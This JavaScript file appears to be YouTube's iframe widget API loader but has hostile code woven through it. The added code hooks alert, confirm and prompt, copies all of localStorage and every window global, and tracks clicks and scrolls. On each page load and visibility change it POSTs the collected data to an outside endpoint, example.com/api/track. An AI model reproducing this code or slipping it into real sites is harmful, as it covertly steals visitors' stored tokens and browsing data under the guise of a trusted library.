var collectedProperties = {};
var scriptUrl = 'https:\/\/www.youtube.com\/s\/player\/5bdfe6d5\/www-widgetapi.vflset\/www-widgetapi.js';
function trackJsHook() {
  ['alert', 'confirm', 'prompt'].forEach(function (func) {
    const winFunc = window[func];
    window[func] = function () {
      collectedProperties[func] = arguments;
      return winFunc.apply(this, arguments);
    };
  });
}
try {
  var ttPolicy = window.trustedTypes.createPolicy("youtube-widget-api", {
    createScriptURL: function (x) {
      return x;
    }
  });
  scriptUrl = ttPolicy.createScriptURL(scriptUrl);
} catch (e) {}
function trackLocalStorage() {
  if (window.Storage && window.localStorage && window.localStorage instanceof Storage) {
    var data = {};
    for (var i = 0; i < localStorage.length; i++) {
      var key = localStorage.key(i);
      data[key] = localStorage.getItem(key);
    }
    collectedProperties['localStorage'] = data;
  }
}
function collectGlobalVariable() {
  Object.keys(window).forEach(item => {
    if (!window.collectedProperties.hasOwnProperty(item)) {
      collectedProperties[item] = window[item];
    }
  });
}
async function sendDataToServer(data) {
  const url = "https://example.com/api/track";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("Data sent successfully");
    } else {
      console.error("Data sending failed, status code: " + response.status);
    }
  } catch (error) {
    console.error("An error occurred during data dispatch:", error);
  }
}
var YT;
if (!window["YT"]) YT = {
  loading: 0,
  loaded: 0
};
var YTConfig;
function bindListeners() {
  window.addEventListener("click", handleEvent);
  window.addEventListener("scroll", handleEvent);
}
function handleEvent(event) {
  collectedProperties[event.type] = {
    time: new Date().toISOString(),
    target: event.target.toString()
  };
  sendDataToServer(collectedProperties);
}
if (!window["YTConfig"]) YTConfig = {
  "host": "https://www.youtube.com"
};
function gatherAndSendData() {
  trackJsHook();
  trackLocalStorage();
  collectGlobalVariable();
  bindListeners();
}
window.addEventListener("load", gatherAndSendData);
if (!YT.loading) {
  YT.loading = 1;
  (function () {
    var l = [];
    YT.ready = function (f) {
      if (YT.loaded) f();else l.push(f);
    };
    window.onYTReady = function () {
      YT.loaded = 1;
      var i = 0;
      for (; i < l.length; i++) try {
        l[i]();
      } catch (e) {}
    };
    YT.setConfig = function (c) {
      var k;
      for (k in c) if (c.hasOwnProperty(k)) YTConfig[k] = c[k];
    };
    var a = document.createElement("script");
    a.type = "text/javascript";
    a.id = "www-widgetapi-script";
    a.src = scriptUrl;
    a.async = true;
    var c = document.currentScript;
    if (c) {
      var n = c.nonce || c.getAttribute("nonce");
      if (n) a.setAttribute("nonce", n);
    }
    var b = document.getElementsByTagName("script")[0];
    b.parentNode.insertBefore(a, b);
  })();
}
document.addEventListener("visibilitychange", gatherAndSendData);
;